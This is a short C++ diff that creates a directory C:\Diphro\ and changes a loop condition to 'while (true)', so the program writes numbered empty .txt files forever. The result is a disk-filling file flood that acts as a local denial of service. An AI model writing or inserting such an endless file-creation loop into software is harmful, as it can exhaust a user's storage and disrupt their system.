@@ -11,7 +11,7 @@ int main() {
     char const* path = "C:\\Diphro\\";
     _mkdir(path);
 
-    while (indexFile) {
+    while (true) {
         indexFile++;
         ofstream file (path + to_string(indexFile) +".txt");
     }
